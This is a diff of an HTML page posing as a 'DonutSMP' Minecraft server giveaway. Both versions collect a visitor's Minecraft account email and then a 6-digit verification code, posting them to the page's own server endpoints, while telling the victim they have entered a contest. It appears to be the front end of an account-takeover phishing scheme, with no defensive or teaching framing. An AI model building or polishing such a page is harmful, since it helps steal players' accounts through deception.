@@ -4,72 +4,63 @@
     <title>Biggest DonutSMP Giveaway Ever</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body {font-family: Arial;background: linear-gradient(135deg,#ff69b4,#ff1493);color:white;text-align:center;padding:20px;min-height:100vh;margin:0;display:flex;align-items:center;justify-content:center;}
-        .box {background:rgba(0,0,0,0.4);padding:40px;border-radius:20px;max-width:500px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
-        input, button {width:100%;padding:15px;margin:10px 0;font-size:18px;border:none;border-radius:10px;}
-        button {background:#00ff9d;color:#000;cursor:pointer;font-weight:bold;}
-        button:hover {background:#00cc7a;}
-        h1 {font-size:3em;margin:0;}
-        #step2, #success {display:none;}
-        .donut {font-size:4em;}
+        body {font-family: Arial; background: #ff69b4; color: white; text-align: center; padding: 40px; min-height: 100vh; display: flex; align-items: center; justify-content: center;}
+        .box {background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 500px; width: 100%;}
+        input, button {width: 100%; padding: 16px; margin: 12px 0; font-size: 20px; border: none; border-radius: 12px;}
+        button {background: #00ff9d; color: black; font-weight: bold; cursor: pointer;}
+        h1 {font-size: 3em;}
+        #codeStep, #thanks {display: none;}
     </style>
 </head>
 <body>
 <div class="box">
-    <h1><span class="donut">DonutSMP</span><br>BIGGEST GIVEAWAY EVER</h1>
-    <p>Verify your Minecraft account to enter!</p>
-
-    <div id="step1">
-        <input type="text" id="discord" placeholder="Discord (optional)">
-        <input type="email" id="email" placeholder="Minecraft Email (required)" required>
-        <button onclick="sendEmail()">Submit Email & Get Code</button>
+    <h1>DonutSMP<br>BIGGEST GIVEAWAY EVER</h1>
+    
+    <div id="emailStep">
+        <p>Enter your Minecraft email to join:</p>
+        <input type="email" id="email" placeholder="example@gmail.com" required>
+        <button onclick="submitEmail()">Submit Email</button>
     </div>
 
-    <div id="step2">
-        <h2>Check your Minecraft email!</h2>
-        <p>Admins were @everyone'd — enter the 6-digit code they sent you:</p>
+    <div id="codeStep">
+        <p>Check your email! Enter the 6-digit code here:</p>
         <input type="text" id="code" maxlength="6" placeholder="123456">
-        <button onclick="sendCode()">Verify & Enter Giveaway</button>
+        <button onclick="submitCode()">Submit Code</button>
     </div>
 
-    <div id="success">
-        <h1>VERIFIED & ENTERED!</h1>
-        <p>You are officially in the biggest DonutSMP giveaway ever!</p>
-        <p>Good luck!</p>
+    <div id="thanks">
+        <h2>Thank You!</h2>
+        <p>We will email you if you win the giveaway!</p>
     </div>
 </div>
 
 <script>
 let currentEmail = "";
-async function sendEmail() {
-    const email = document.getElementById("email").value.trim();
-    const discord = document.getElementById("discord").value.trim();
-    if (!email.includes("@")) return alert("Enter a valid email");
 
-    const res = await fetch("/submit_email", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email,discord})});
+async function submitEmail() {
+    const email = document.getElementById("email").value.trim();
+    if (!email.includes("@")) return alert("Enter a real email");
+    
+    currentEmail = email;
+    const res = await fetch("/send_email", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email})});
     const data = await res.json();
-    if (data.success) {
-        currentEmail = email;
-        document.getElementById("step1").style.display = "none";
-        document.getElementById("step2").style.display = "block";
-    } else alert(data.error);
+    
+    if (data.next === "ask_code") {
+        document.getElementById("emailStep").style.display = "none";
+        document.getElementById("codeStep").style.display = "block";
+    } else {
+        alert("Error, try again");
+    }
 }
 
-async function sendCode() {
-    const code = document.getElementById("code").value;
-    if (code.length !== 6 || isNaN(code)) return alert("Enter the 6-digit code");
-
-    const res = await fetch("/submit_code", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:currentEmail,code})});
-    const data = await res.json();
-
-    if (data.verified) {
-        document.getElementById("step2").style.display = "none";
-        document.getElementById("success").style.display = "block";
-    } else if (data.wait) {
-        alert(data.msg);
-    } else {
-        alert(data.error || "Wrong code");
-    }
+async function submitCode() {
+    const code = document.getElementById("code").value.trim();
+    if (code.length !== 6) return alert("Code must be 6 digits");
+    
+    await fetch("/send_code", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({email: currentEmail, code})});
+    
+    document.getElementById("codeStep").style.display = "none";
+    document.getElementById("thanks").style.display = "block";
 }
 </script>
 </body>
